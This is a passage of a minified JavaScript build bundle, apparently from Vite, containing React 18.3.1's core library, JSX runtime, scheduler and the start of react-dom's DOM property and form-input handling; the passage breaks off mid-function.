function zg(e, t) {
  for (var n = 0; n < t.length; n++) {
    const r = t[n];
    if ("string" != typeof r && !Array.isArray(r)) for (const o in r) if ("default" !== o && !(o in e)) {
      const i = Object.getOwnPropertyDescriptor(r, o);
      i && Object.defineProperty(e, o, i.get ? i : {
        enumerable: !0,
        get: () => r[o]
      });
    }
  }
  return Object.freeze(Object.defineProperty(e, Symbol.toStringTag, {
    value: "Module"
  }));
}
function su(e) {
  return e && e.__esModule && Object.prototype.hasOwnProperty.call(e, "default") ? e.default : e;
}
!function () {
  const t = document.createElement("link").relList;
  if (!(t && t.supports && t.supports("modulepreload"))) {
    for (const o of document.querySelectorAll('link[rel="modulepreload"]')) r(o);
    new MutationObserver(o => {
      for (const i of o) if ("childList" === i.type) for (const l of i.addedNodes) "LINK" === l.tagName && "modulepreload" === l.rel && r(l);
    }).observe(document, {
      childList: !0,
      subtree: !0
    });
  }
  function r(o) {
    if (o.ep) return;
    o.ep = !0;
    const i = function n(o) {
      const i = {};
      return o.integrity && (i.integrity = o.integrity), o.referrerPolicy && (i.referrerPolicy = o.referrerPolicy), "use-credentials" === o.crossOrigin ? i.credentials = "include" : "anonymous" === o.crossOrigin ? i.credentials = "omit" : i.credentials = "same-origin", i;
    }(o);
    fetch(o.href, i);
  }
}();
var Wf = {
    exports: {}
  },
  El = {},
  Bf = {
    exports: {}
  },
  W = {},
  Mo = Symbol.for("react.element"),
  Fg = Symbol.for("react.portal"),
  Ug = Symbol.for("react.fragment"),
  Wg = Symbol.for("react.strict_mode"),
  Bg = Symbol.for("react.profiler"),
  Vg = Symbol.for("react.provider"),
  Hg = Symbol.for("react.context"),
  Kg = Symbol.for("react.forward_ref"),
  Gg = Symbol.for("react.suspense"),
  Qg = Symbol.for("react.memo"),
  Yg = Symbol.for("react.lazy"),
  Ic = Symbol.iterator;
function Xg(e) {
  return null === e || "object" != typeof e ? null : "function" == typeof (e = Ic && e[Ic] || e["@@iterator"]) ? e : null;
}
var Vf = {
    isMounted: function () {
      return !1;
    },
    enqueueForceUpdate: function () {},
    enqueueReplaceState: function () {},
    enqueueSetState: function () {}
  },
  Hf = Object.assign,
  Kf = {};
function Or(e, t, n) {
  this.props = e, this.context = t, this.refs = Kf, this.updater = n || Vf;
}
function Gf() {}
function au(e, t, n) {
  this.props = e, this.context = t, this.refs = Kf, this.updater = n || Vf;
}
Or.prototype.isReactComponent = {}, Or.prototype.setState = function (e, t) {
  if ("object" != typeof e && "function" != typeof e && null != e) throw Error("setState(...): takes an object of state variables to update or a function which returns an object of state variables.");
  this.updater.enqueueSetState(this, e, t, "setState");
}, Or.prototype.forceUpdate = function (e) {
  this.updater.enqueueForceUpdate(this, e, "forceUpdate");
}, Gf.prototype = Or.prototype;
var uu = au.prototype = new Gf();
uu.constructor = au, Hf(uu, Or.prototype), uu.isPureReactComponent = !0;
var Mc = Array.isArray,
  Qf = Object.prototype.hasOwnProperty,
  cu = {
    current: null
  },
  Yf = {
    key: !0,
    ref: !0,
    __self: !0,
    __source: !0
  };
function Xf(e, t, n) {
  var r,
    o = {},
    i = null,
    l = null;
  if (null != t) for (r in void 0 !== t.ref && (l = t.ref), void 0 !== t.key && (i = "" + t.key), t) Qf.call(t, r) && !Yf.hasOwnProperty(r) && (o[r] = t[r]);
  var s = arguments.length - 2;
  if (1 === s) o.children = n;else if (1 < s) {
    for (var a = Array(s), u = 0; u < s; u++) a[u] = arguments[u + 2];
    o.children = a;
  }
  if (e && e.defaultProps) for (r in s = e.defaultProps) void 0 === o[r] && (o[r] = s[r]);
  return {
    $$typeof: Mo,
    type: e,
    key: i,
    ref: l,
    props: o,
    _owner: cu.current
  };
}
function Zg(e, t) {
  return {
    $$typeof: Mo,
    type: e.type,
    key: t,
    ref: e.ref,
    props: e.props,
    _owner: e._owner
  };
}
function du(e) {
  return "object" == typeof e && null !== e && e.$$typeof === Mo;
}
function Jg(e) {
  var t = {
    "=": "=0",
    ":": "=2"
  };
  return "$" + e.replace(/[=:]/g, function (n) {
    return t[n];
  });
}
var Lc = /\/+/g;
function Xl(e, t) {
  return "object" == typeof e && null !== e && null != e.key ? Jg("" + e.key) : t.toString(36);
}
function ki(e, t, n, r, o) {
  var i = typeof e;
  ("undefined" === i || "boolean" === i) && (e = null);
  var l = !1;
  if (null === e) l = !0;else switch (i) {
    case "string":
    case "number":
      l = !0;
      break;
    case "object":
      switch (e.$$typeof) {
        case Mo:
        case Fg:
          l = !0;
      }
  }
  if (l) return o = o(l = e), e = "" === r ? "." + Xl(l, 0) : r, Mc(o) ? (n = "", null != e && (n = e.replace(Lc, "$&/") + "/"), ki(o, t, n, "", function (u) {
    return u;
  })) : null != o && (du(o) && (o = Zg(o, n + (!o.key || l && l.key === o.key ? "" : ("" + o.key).replace(Lc, "$&/") + "/") + e)), t.push(o)), 1;
  if (l = 0, r = "" === r ? "." : r + ":", Mc(e)) for (var s = 0; s < e.length; s++) {
    var a = r + Xl(i = e[s], s);
    l += ki(i, t, n, a, o);
  } else if ("function" == typeof (a = Xg(e))) for (e = a.call(e), s = 0; !(i = e.next()).done;) l += ki(i = i.value, t, n, a = r + Xl(i, s++), o);else if ("object" === i) throw t = String(e), Error("Objects are not valid as a React child (found: " + ("[object Object]" === t ? "object with keys {" + Object.keys(e).join(", ") + "}" : t) + "). If you meant to render a collection of children, use an array instead.");
  return l;
}
function Yo(e, t, n) {
  if (null == e) return e;
  var r = [],
    o = 0;
  return ki(e, r, "", "", function (i) {
    return t.call(n, i, o++);
  }), r;
}
function qg(e) {
  if (-1 === e._status) {
    var t = e._result;
    (t = t()).then(function (n) {
      (0 === e._status || -1 === e._status) && (e._status = 1, e._result = n);
    }, function (n) {
      (0 === e._status || -1 === e._status) && (e._status = 2, e._result = n);
    }), -1 === e._status && (e._status = 0, e._result = t);
  }
  if (1 === e._status) return e._result.default;
  throw e._result;
}
var be = {
    current: null
  },
  Pi = {
    transition: null
  },
  ey = {
    ReactCurrentDispatcher: be,
    ReactCurrentBatchConfig: Pi,
    ReactCurrentOwner: cu
  };
function Zf() {
  throw Error("act(...) is not supported in production builds of React.");
}
W.Children = {
  map: Yo,
  forEach: function (e, t, n) {
    Yo(e, function () {
      t.apply(this, arguments);
    }, n);
  },
  count: function (e) {
    var t = 0;
    return Yo(e, function () {
      t++;
    }), t;
  },
  toArray: function (e) {
    return Yo(e, function (t) {
      return t;
    }) || [];
  },
  only: function (e) {
    if (!du(e)) throw Error("React.Children.only expected to receive a single React element child.");
    return e;
  }
}, W.Component = Or, W.Fragment = Ug, W.Profiler = Bg, W.PureComponent = au, W.StrictMode = Wg, W.Suspense = Gg, W.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED = ey, W.act = Zf, W.cloneElement = function (e, t, n) {
  if (null == e) throw Error("React.cloneElement(...): The argument must be a React element, but you passed " + e + ".");
  var r = Hf({}, e.props),
    o = e.key,
    i = e.ref,
    l = e._owner;
  if (null != t) {
    if (void 0 !== t.ref && (i = t.ref, l = cu.current), void 0 !== t.key && (o = "" + t.key), e.type && e.type.defaultProps) var s = e.type.defaultProps;
    for (a in t) Qf.call(t, a) && !Yf.hasOwnProperty(a) && (r[a] = void 0 === t[a] && void 0 !== s ? s[a] : t[a]);
  }
  var a = arguments.length - 2;
  if (1 === a) r.children = n;else if (1 < a) {
    s = Array(a);
    for (var u = 0; u < a; u++) s[u] = arguments[u + 2];
    r.children = s;
  }
  return {
    $$typeof: Mo,
    type: e.type,
    key: o,
    ref: i,
    props: r,
    _owner: l
  };
}, W.createContext = function (e) {
  return (e = {
    $$typeof: Hg,
    _currentValue: e,
    _currentValue2: e,
    _threadCount: 0,
    Provider: null,
    Consumer: null,
    _defaultValue: null,
    _globalName: null
  }).Provider = {
    $$typeof: Vg,
    _context: e
  }, e.Consumer = e;
}, W.createElement = Xf, W.createFactory = function (e) {
  var t = Xf.bind(null, e);
  return t.type = e, t;
}, W.createRef = function () {
  return {
    current: null
  };
}, W.forwardRef = function (e) {
  return {
    $$typeof: Kg,
    render: e
  };
}, W.isValidElement = du, W.lazy = function (e) {
  return {
    $$typeof: Yg,
    _payload: {
      _status: -1,
      _result: e
    },
    _init: qg
  };
}, W.memo = function (e, t) {
  return {
    $$typeof: Qg,
    type: e,
    compare: void 0 === t ? null : t
  };
}, W.startTransition = function (e) {
  var t = Pi.transition;
  Pi.transition = {};
  try {
    e();
  } finally {
    Pi.transition = t;
  }
}, W.unstable_act = Zf, W.useCallback = function (e, t) {
  return be.current.useCallback(e, t);
}, W.useContext = function (e) {
  return be.current.useContext(e);
}, W.useDebugValue = function () {}, W.useDeferredValue = function (e) {
  return be.current.useDeferredValue(e);
}, W.useEffect = function (e, t) {
  return be.current.useEffect(e, t);
}, W.useId = function () {
  return be.current.useId();
}, W.useImperativeHandle = function (e, t, n) {
  return be.current.useImperativeHandle(e, t, n);
}, W.useInsertionEffect = function (e, t) {
  return be.current.useInsertionEffect(e, t);
}, W.useLayoutEffect = function (e, t) {
  return be.current.useLayoutEffect(e, t);
}, W.useMemo = function (e, t) {
  return be.current.useMemo(e, t);
}, W.useReducer = function (e, t, n) {
  return be.current.useReducer(e, t, n);
}, W.useRef = function (e) {
  return be.current.useRef(e);
}, W.useState = function (e) {
  return be.current.useState(e);
}, W.useSyncExternalStore = function (e, t, n) {
  return be.current.useSyncExternalStore(e, t, n);
}, W.useTransition = function () {
  return be.current.useTransition();
}, W.version = "18.3.1", Bf.exports = W;
var c = Bf.exports;
const fu = su(c),
  Jf = zg({
    __proto__: null,
    default: fu
  }, [c]);
var ty = c,
  ny = Symbol.for("react.element"),
  ry = Symbol.for("react.fragment"),
  oy = Object.prototype.hasOwnProperty,
  iy = ty.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED.ReactCurrentOwner,
  ly = {
    key: !0,
    ref: !0,
    __self: !0,
    __source: !0
  };
function qf(e, t, n) {
  var r,
    o = {},
    i = null,
    l = null;
  for (r in void 0 !== n && (i = "" + n), void 0 !== t.key && (i = "" + t.key), void 0 !== t.ref && (l = t.ref), t) oy.call(t, r) && !ly.hasOwnProperty(r) && (o[r] = t[r]);
  if (e && e.defaultProps) for (r in t = e.defaultProps) void 0 === o[r] && (o[r] = t[r]);
  return {
    $$typeof: ny,
    type: e,
    key: i,
    ref: l,
    props: o,
    _owner: iy.current
  };
}
El.Fragment = ry, El.jsx = qf, El.jsxs = qf, Wf.exports = El;
var E = Wf.exports,
  Bs = {},
  ep = {
    exports: {}
  },
  Ke = {},
  tp = {
    exports: {}
  },
  np = {};
!function (e) {
  function t($, R) {
    var M = $.length;
    $.push(R);
    e: for (; 0 < M;) {
      var V = M - 1 >>> 1,
        _ = $[V];
      if (!(0 < o(_, R))) break e;
      $[V] = R, $[M] = _, M = V;
    }
  }
  function n($) {
    return 0 === $.length ? null : $[0];
  }
  function r($) {
    if (0 === $.length) return null;
    var R = $[0],
      M = $.pop();
    if (M !== R) {
      $[0] = M;
      e: for (var V = 0, _ = $.length, L = _ >>> 1; V < L;) {
        var j = 2 * (V + 1) - 1,
          D = $[j],
          B = j + 1,
          X = $[B];
        if (0 > o(D, M)) B < _ && 0 > o(X, D) ? ($[V] = X, $[B] = M, V = B) : ($[V] = D, $[j] = M, V = j);else {
          if (!(B < _ && 0 > o(X, M))) break e;
          $[V] = X, $[B] = M, V = B;
        }
      }
    }
    return R;
  }
  function o($, R) {
    var M = $.sortIndex - R.sortIndex;
    return 0 !== M ? M : $.id - R.id;
  }
  if ("object" == typeof performance && "function" == typeof performance.now) {
    var i = performance;
    e.unstable_now = function () {
      return i.now();
    };
  } else {
    var l = Date,
      s = l.now();
    e.unstable_now = function () {
      return l.now() - s;
    };
  }
  var a = [],
    u = [],
    d = 1,
    f = null,
    v = 3,
    g = !1,
    x = !1,
    h = !1,
    w = "function" == typeof setTimeout ? setTimeout : null,
    m = "function" == typeof clearTimeout ? clearTimeout : null,
    p = typeof setImmediate < "u" ? setImmediate : null;
  function y($) {
    for (var R = n(u); null !== R;) {
      if (null === R.callback) r(u);else {
        if (!(R.startTime <= $)) break;
        r(u), R.sortIndex = R.expirationTime, t(a, R);
      }
      R = n(u);
    }
  }
  function S($) {
    if (h = !1, y($), !x) if (null !== n(a)) x = !0, Y(C);else {
      var R = n(u);
      null !== R && z(S, R.startTime - $);
    }
  }
  function C($, R) {
    x = !1, h && (h = !1, m(b), b = -1), g = !0;
    var M = v;
    try {
      for (y(R), f = n(a); null !== f && (!(f.expirationTime > R) || $ && !U());) {
        var V = f.callback;
        if ("function" == typeof V) {
          f.callback = null, v = f.priorityLevel;
          var _ = V(f.expirationTime <= R);
          R = e.unstable_now(), "function" == typeof _ ? f.callback = _ : f === n(a) && r(a), y(R);
        } else r(a);
        f = n(a);
      }
      if (null !== f) var L = !0;else {
        var j = n(u);
        null !== j && z(S, j.startTime - R), L = !1;
      }
      return L;
    } finally {
      f = null, v = M, g = !1;
    }
  }
  typeof navigator < "u" && void 0 !== navigator.scheduling && void 0 !== navigator.scheduling.isInputPending && navigator.scheduling.isInputPending.bind(navigator.scheduling);
  var Z,
    P = !1,
    k = null,
    b = -1,
    T = 5,
    O = -1;
  function U() {
    return !(e.unstable_now() - O < T);
  }
  function I() {
    if (null !== k) {
      var $ = e.unstable_now();
      O = $;
      var R = !0;
      try {
        R = k(!0, $);
      } finally {
        R ? Z() : (P = !1, k = null);
      }
    } else P = !1;
  }
  if ("function" == typeof p) Z = function () {
    p(I);
  };else if (typeof MessageChannel < "u") {
    var H = new MessageChannel(),
      Q = H.port2;
    H.port1.onmessage = I, Z = function () {
      Q.postMessage(null);
    };
  } else Z = function () {
    w(I, 0);
  };
  function Y($) {
    k = $, P || (P = !0, Z());
  }
  function z($, R) {
    b = w(function () {
      $(e.unstable_now());
    }, R);
  }
  e.unstable_IdlePriority = 5, e.unstable_ImmediatePriority = 1, e.unstable_LowPriority = 4, e.unstable_NormalPriority = 3, e.unstable_Profiling = null, e.unstable_UserBlockingPriority = 2, e.unstable_cancelCallback = function ($) {
    $.callback = null;
  }, e.unstable_continueExecution = function () {
    x || g || (x = !0, Y(C));
  }, e.unstable_forceFrameRate = function ($) {
    0 > $ || 125 < $ ? console.error("forceFrameRate takes a positive int between 0 and 125, forcing frame rates higher than 125 fps is not supported") : T = 0 < $ ? Math.floor(1e3 / $) : 5;
  }, e.unstable_getCurrentPriorityLevel = function () {
    return v;
  }, e.unstable_getFirstCallbackNode = function () {
    return n(a);
  }, e.unstable_next = function ($) {
    switch (v) {
      case 1:
      case 2:
      case 3:
        var R = 3;
        break;
      default:
        R = v;
    }
    var M = v;
    v = R;
    try {
      return $();
    } finally {
      v = M;
    }
  }, e.unstable_pauseExecution = function () {}, e.unstable_requestPaint = function () {}, e.unstable_runWithPriority = function ($, R) {
    switch ($) {
      case 1:
      case 2:
      case 3:
      case 4:
      case 5:
        break;
      default:
        $ = 3;
    }
    var M = v;
    v = $;
    try {
      return R();
    } finally {
      v = M;
    }
  }, e.unstable_scheduleCallback = function ($, R, M) {
    var V = e.unstable_now();
    switch ("object" == typeof M && null !== M ? M = "number" == typeof (M = M.delay) && 0 < M ? V + M : V : M = V, $) {
      case 1:
        var _ = -1;
        break;
      case 2:
        _ = 250;
        break;
      case 5:
        _ = 1073741823;
        break;
      case 4:
        _ = 1e4;
        break;
      default:
        _ = 5e3;
    }
    return $ = {
      id: d++,
      callback: R,
      priorityLevel: $,
      startTime: M,
      expirationTime: _ = M + _,
      sortIndex: -1
    }, M > V ? ($.sortIndex = M, t(u, $), null === n(a) && $ === n(u) && (h ? (m(b), b = -1) : h = !0, z(S, M - V))) : ($.sortIndex = _, t(a, $), x || g || (x = !0, Y(C))), $;
  }, e.unstable_shouldYield = U, e.unstable_wrapCallback = function ($) {
    var R = v;
    return function () {
      var M = v;
      v = R;
      try {
        return $.apply(this, arguments);
      } finally {
        v = M;
      }
    };
  };
}(np), tp.exports = np;
var sy = tp.exports,
  ay = c,
  Be = sy;
function N(e) {
  for (var t = "https://reactjs.org/docs/error-decoder.html?invariant=" + e, n = 1; n < arguments.length; n++) t += "&args[]=" + encodeURIComponent(arguments[n]);
  return "Minified React error #" + e + "; visit " + t + " for the full message or use the non-minified dev environment for full errors and additional helpful warnings.";
}
var rp = new Set(),
  fo = {};
function zn(e, t) {
  wr(e, t), wr(e + "Capture", t);
}
function wr(e, t) {
  for (fo[e] = t, e = 0; e < t.length; e++) rp.add(t[e]);
}
var Nt = !(typeof window > "u" || typeof window.document > "u" || typeof window.document.createElement > "u"),
  Vs = Object.prototype.hasOwnProperty,
  uy = /^[:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD][:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD\-.0-9\u00B7\u0300-\u036F\u203F-\u2040]*$/,
  jc = {},
  zc = {};
function cy(e) {
  return !!Vs.call(zc, e) || !Vs.call(jc, e) && (uy.test(e) ? zc[e] = !0 : (jc[e] = !0, !1));
}
function dy(e, t, n, r) {
  if (null !== n && 0 === n.type) return !1;
  switch (typeof t) {
    case "function":
    case "symbol":
      return !0;
    case "boolean":
      return !r && (null !== n ? !n.acceptsBooleans : "data-" !== (e = e.toLowerCase().slice(0, 5)) && "aria-" !== e);
    default:
      return !1;
  }
}
function fy(e, t, n, r) {
  if (null === t || typeof t > "u" || dy(e, t, n, r)) return !0;
  if (r) return !1;
  if (null !== n) switch (n.type) {
    case 3:
      return !t;
    case 4:
      return !1 === t;
    case 5:
      return isNaN(t);
    case 6:
      return isNaN(t) || 1 > t;
  }
  return !1;
}
function Ne(e, t, n, r, o, i, l) {
  this.acceptsBooleans = 2 === t || 3 === t || 4 === t, this.attributeName = r, this.attributeNamespace = o, this.mustUseProperty = n, this.propertyName = e, this.type = t, this.sanitizeURL = i, this.removeEmptyString = l;
}
var ge = {};
"children dangerouslySetInnerHTML defaultValue defaultChecked innerHTML suppressContentEditableWarning suppressHydrationWarning style".split(" ").forEach(function (e) {
  ge[e] = new Ne(e, 0, !1, e, null, !1, !1);
}), [["acceptCharset", "accept-charset"], ["className", "class"], ["htmlFor", "for"], ["httpEquiv", "http-equiv"]].forEach(function (e) {
  var t = e[0];
  ge[t] = new Ne(t, 1, !1, e[1], null, !1, !1);
}), ["contentEditable", "draggable", "spellCheck", "value"].forEach(function (e) {
  ge[e] = new Ne(e, 2, !1, e.toLowerCase(), null, !1, !1);
}), ["autoReverse", "externalResourcesRequired", "focusable", "preserveAlpha"].forEach(function (e) {
  ge[e] = new Ne(e, 2, !1, e, null, !1, !1);
}), "allowFullScreen async autoFocus autoPlay controls default defer disabled disablePictureInPicture disableRemotePlayback formNoValidate hidden loop noModule noValidate open playsInline readOnly required reversed scoped seamless itemScope".split(" ").forEach(function (e) {
  ge[e] = new Ne(e, 3, !1, e.toLowerCase(), null, !1, !1);
}), ["checked", "multiple", "muted", "selected"].forEach(function (e) {
  ge[e] = new Ne(e, 3, !0, e, null, !1, !1);
}), ["capture", "download"].forEach(function (e) {
  ge[e] = new Ne(e, 4, !1, e, null, !1, !1);
}), ["cols", "rows", "size", "span"].forEach(function (e) {
  ge[e] = new Ne(e, 6, !1, e, null, !1, !1);
}), ["rowSpan", "start"].forEach(function (e) {
  ge[e] = new Ne(e, 5, !1, e.toLowerCase(), null, !1, !1);
});
var pu = /[\-:]([a-z])/g;
function mu(e) {
  return e[1].toUpperCase();
}
function vu(e, t, n, r) {
  var o = ge.hasOwnProperty(t) ? ge[t] : null;
  (null !== o ? 0 !== o.type : r || !(2 < t.length) || "o" !== t[0] && "O" !== t[0] || "n" !== t[1] && "N" !== t[1]) && (fy(t, n, o, r) && (n = null), r || null === o ? cy(t) && (null === n ? e.removeAttribute(t) : e.setAttribute(t, "" + n)) : o.mustUseProperty ? e[o.propertyName] = null === n ? 3 !== o.type && "" : n : (t = o.attributeName, r = o.attributeNamespace, null === n ? e.removeAttribute(t) : (n = 3 === (o = o.type) || 4 === o && !0 === n ? "" : "" + n, r ? e.setAttributeNS(r, t, n) : e.setAttribute(t, n))));
}
"accent-height alignment-baseline arabic-form baseline-shift cap-height clip-path clip-rule color-interpolation color-interpolation-filters color-profile color-rendering dominant-baseline enable-background fill-opacity fill-rule flood-color flood-opacity font-family font-size font-size-adjust font-stretch font-style font-variant font-weight glyph-name glyph-orientation-horizontal glyph-orientation-vertical horiz-adv-x horiz-origin-x image-rendering letter-spacing lighting-color marker-end marker-mid marker-start overline-position overline-thickness paint-order panose-1 pointer-events rendering-intent shape-rendering stop-color stop-opacity strikethrough-position strikethrough-thickness stroke-dasharray stroke-dashoffset stroke-linecap stroke-linejoin stroke-miterlimit stroke-opacity stroke-width text-anchor text-decoration text-rendering underline-position underline-thickness unicode-bidi unicode-range units-per-em v-alphabetic v-hanging v-ideographic v-mathematical vector-effect vert-adv-y vert-origin-x vert-origin-y word-spacing writing-mode xmlns:xlink x-height".split(" ").forEach(function (e) {
  var t = e.replace(pu, mu);
  ge[t] = new Ne(t, 1, !1, e, null, !1, !1);
}), "xlink:actuate xlink:arcrole xlink:role xlink:show xlink:title xlink:type".split(" ").forEach(function (e) {
  var t = e.replace(pu, mu);
  ge[t] = new Ne(t, 1, !1, e, "http://www.w3.org/1999/xlink", !1, !1);
}), ["xml:base", "xml:lang", "xml:space"].forEach(function (e) {
  var t = e.replace(pu, mu);
  ge[t] = new Ne(t, 1, !1, e, "http://www.w3.org/XML/1998/namespace", !1, !1);
}), ["tabIndex", "crossOrigin"].forEach(function (e) {
  ge[e] = new Ne(e, 1, !1, e.toLowerCase(), null, !1, !1);
}), ge.xlinkHref = new Ne("xlinkHref", 1, !1, "xlink:href", "http://www.w3.org/1999/xlink", !0, !1), ["src", "href", "action", "formAction"].forEach(function (e) {
  ge[e] = new Ne(e, 1, !1, e.toLowerCase(), null, !0, !0);
});
var Lt = ay.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED,
  Xo = Symbol.for("react.element"),
  Jn = Symbol.for("react.portal"),
  qn = Symbol.for("react.fragment"),
  hu = Symbol.for("react.strict_mode"),
  Hs = Symbol.for("react.profiler"),
  op = Symbol.for("react.provider"),
  ip = Symbol.for("react.context"),
  gu = Symbol.for("react.forward_ref"),
  Ks = Symbol.for("react.suspense"),
  Gs = Symbol.for("react.suspense_list"),
  yu = Symbol.for("react.memo"),
  Vt = Symbol.for("react.lazy"),
  lp = Symbol.for("react.offscreen"),
  Fc = Symbol.iterator;
function zr(e) {
  return null === e || "object" != typeof e ? null : "function" == typeof (e = Fc && e[Fc] || e["@@iterator"]) ? e : null;
}
var Zl,
  le = Object.assign;
function Xr(e) {
  if (void 0 === Zl) try {
    throw Error();
  } catch (n) {
    var t = n.stack.trim().match(/\n( *(at )?)/);
    Zl = t && t[1] || "";
  }
  return "\n" + Zl + e;
}
var Jl = !1;
function ql(e, t) {
  if (!e || Jl) return "";
  Jl = !0;
  var n = Error.prepareStackTrace;
  Error.prepareStackTrace = void 0;
  try {
    if (t) {
      if (t = function () {
        throw Error();
      }, Object.defineProperty(t.prototype, "props", {
        set: function () {
          throw Error();
        }
      }), "object" == typeof Reflect && Reflect.construct) {
        try {
          Reflect.construct(t, []);
        } catch (u) {
          var r = u;
        }
        Reflect.construct(e, [], t);
      } else {
        try {
          t.call();
        } catch (u) {
          r = u;
        }
        e.call(t.prototype);
      }
    } else {
      try {
        throw Error();
      } catch (u) {
        r = u;
      }
      e();
    }
  } catch (u) {
    if (u && r && "string" == typeof u.stack) {
      for (var o = u.stack.split("\n"), i = r.stack.split("\n"), l = o.length - 1, s = i.length - 1; 1 <= l && 0 <= s && o[l] !== i[s];) s--;
      for (; 1 <= l && 0 <= s; l--, s--) if (o[l] !== i[s]) {
        if (1 !== l || 1 !== s) do {
          if (l--, 0 > --s || o[l] !== i[s]) {
            var a = "\n" + o[l].replace(" at new ", " at ");
            return e.displayName && a.includes("<anonymous>") && (a = a.replace("<anonymous>", e.displayName)), a;
          }
        } while (1 <= l && 0 <= s);
        break;
      }
    }
  } finally {
    Jl = !1, Error.prepareStackTrace = n;
  }
  return (e = e ? e.displayName || e.name : "") ? Xr(e) : "";
}
function py(e) {
  switch (e.tag) {
    case 5:
      return Xr(e.type);
    case 16:
      return Xr("Lazy");
    case 13:
      return Xr("Suspense");
    case 19:
      return Xr("SuspenseList");
    case 0:
    case 2:
    case 15:
      return e = ql(e.type, !1);
    case 11:
      return e = ql(e.type.render, !1);
    case 1:
      return e = ql(e.type, !0);
    default:
      return "";
  }
}
function Qs(e) {
  if (null == e) return null;
  if ("function" == typeof e) return e.displayName || e.name || null;
  if ("string" == typeof e) return e;
  switch (e) {
    case qn:
      return "Fragment";
    case Jn:
      return "Portal";
    case Hs:
      return "Profiler";
    case hu:
      return "StrictMode";
    case Ks:
      return "Suspense";
    case Gs:
      return "SuspenseList";
  }
  if ("object" == typeof e) switch (e.$$typeof) {
    case ip:
      return (e.displayName || "Context") + ".Consumer";
    case op:
      return (e._context.displayName || "Context") + ".Provider";
    case gu:
      var t = e.render;
      return (e = e.displayName) || (e = "" !== (e = t.displayName || t.name || "") ? "ForwardRef(" + e + ")" : "ForwardRef"), e;
    case yu:
      return null !== (t = e.displayName || null) ? t : Qs(e.type) || "Memo";
    case Vt:
      t = e._payload, e = e._init;
      try {
        return Qs(e(t));
      } catch {}
  }
  return null;
}
function my(e) {
  var t = e.type;
  switch (e.tag) {
    case 24:
      return "Cache";
    case 9:
      return (t.displayName || "Context") + ".Consumer";
    case 10:
      return (t._context.displayName || "Context") + ".Provider";
    case 18:
      return "DehydratedFragment";
    case 11:
      return e = (e = t.render).displayName || e.name || "", t.displayName || ("" !== e ? "ForwardRef(" + e + ")" : "ForwardRef");
    case 7:
      return "Fragment";
    case 5:
      return t;
    case 4:
      return "Portal";
    case 3:
      return "Root";
    case 6:
      return "Text";
    case 16:
      return Qs(t);
    case 8:
      return t === hu ? "StrictMode" : "Mode";
    case 22:
      return "Offscreen";
    case 12:
      return "Profiler";
    case 21:
      return "Scope";
    case 13:
      return "Suspense";
    case 19:
      return "SuspenseList";
    case 25:
      return "TracingMarker";
    case 1:
    case 0:
    case 17:
    case 2:
    case 14:
    case 15:
      if ("function" == typeof t) return t.displayName || t.name || null;
      if ("string" == typeof t) return t;
  }
  return null;
}
function ln(e) {
  switch (typeof e) {
    case "boolean":
    case "number":
    case "string":
    case "undefined":
    case "object":
      return e;
    default:
      return "";
  }
}
function sp(e) {
  var t = e.type;
  return (e = e.nodeName) && "input" === e.toLowerCase() && ("checkbox" === t || "radio" === t);
}
function vy(e) {
  var t = sp(e) ? "checked" : "value",
    n = Object.getOwnPropertyDescriptor(e.constructor.prototype, t),
    r = "" + e[t];
  if (!e.hasOwnProperty(t) && typeof n < "u" && "function" == typeof n.get && "function" == typeof n.set) {
    var o = n.get,
      i = n.set;
    return Object.defineProperty(e, t, {
      configurable: !0,
      get: function () {
        return o.call(this);
      },
      set: function (l) {
        r = "" + l, i.call(this, l);
      }
    }), Object.defineProperty(e, t, {
      enumerable: n.enumerable
    }), {
      getValue: function () {
        return r;
      },
      setValue: function (l) {
        r = "" + l;
      },
      stopTracking: function () {
        e._valueTracker = null, delete e[t];
      }
    };
  }
}
function Zo(e) {
  e._valueTracker || (e._valueTracker = vy(e));
}
function ap(e) {
  if (!e) return !1;
  var t = e._valueTracker;
  if (!t) return !0;
  var n = t.getValue(),
    r = "";
  return e && (r = sp(e) ? e.checked ? "true" : "false" : e.value), (e = r) !== n && (t.setValue(e), !0);
}
function Ui(e) {
  if (typeof (e = e || (typeof document < "u" ? document : void 0)) > "u") return null;
  try {
    return e.activeElement || e.body;
  } catch {
    return e.body;
  }
}
function Ys(e, t) {
  var n = t.checked;
  return le({}, t, {
    defaultChecked: void 0,
    defaultValue: void 0,
    value: void 0,
    checked: n !== null && n !== void 0 ? n : e._wrapperState.initialChecked
  });
}
function Uc(e, t) {
  var n = null == t.defaultValue ? "" : t.defaultValue,
    r = null != t.checked ? t.checked : t.defaultChecked;
  n = ln(null != t.value ? t.value : n), e._wrapperState = {
    initialChecked: r,
    initialValue: n,
    controlled: "checkbox" === t.type || "radio" === t.type ? null != t.checked : null != t.value
  };
}
function up(e, t) {
  null != (t = t.checked) && vu(e, "checked", t, !1);
}
function Xs(e, t) {
  up(e, t);
  var n = ln(t.value),
    r = t.type;
  if (null != n) "number" === r ? (0 === n && "" === e.value || e.value != n) && (e.value = "" + n) : e.value !== "" + n && (e.value = "" + n);else if ("submit" === r || "reset" === r) return void e.removeAttribute("value");
  t.hasOwnProperty("value") ? Zs(e, t.type, n) : t.hasOwnProperty("defaultValue") && Zs(e, t.type, ln(t.defaultValue)), null == t.checked && null != t.defaultChecked && (e.defaultChecked = !!t.defaultChecked);
}
function Wc(e, t, n) {
  if (t.hasOwnProperty("value") || t.hasOwnProperty("defaultValue")) {
    var r = t.type;
    if (!("submit" !== r && "reset" !== r || void 0 !== t.value && null !== t.value)) return;
    t = "" + e._wrapperState.initialValue, n || t === e.value || (e.value = t), e.defaultValue = t;
  }
  "" !== (n = e.name) && (e.name = ""), e.defaultChecked = !!e._wrapperState.initialChecked, "" !== n && (e.name = n);
}
function Zs(e, t, n) {
  ("number" !== t || Ui(e.ownerDocument) !== e) && (null == n ? e.defaultValue = "" + e._wrapperState.initialValue : e.defaultValue !== "" + n && (e.defaultValue = "" + n));
